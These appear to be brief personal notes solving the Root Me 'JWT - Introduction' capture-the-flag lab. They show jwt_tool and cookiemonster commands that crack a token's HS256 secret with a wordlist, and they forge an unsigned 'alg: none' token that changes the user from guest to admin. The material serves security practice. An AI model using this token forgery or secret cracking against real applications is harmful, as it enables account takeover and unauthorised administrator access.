```shell
cookiemonster -cookie eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk



#estefade
cd ~/Desktop/jwt_tool
source venv/bin/activate
python3 jwt_tool.py <JWT>
deactivate #exit venv
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk -C -d jwt.secrets.list
```
root me  JWT - Introduction
```php
json=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 --> {"typ": "JWT","alg": "HS256"}-->
{"typ": "JWT","alg": "none"}-->eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0

eyJ1c2VybmFtZSI6Imd1ZXN0In0 -->{"username": "guest"}-->{"username":"admin"}-->
eyJ1c2VybmFtZSI6ImFkbWluIn0

json=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0 +
```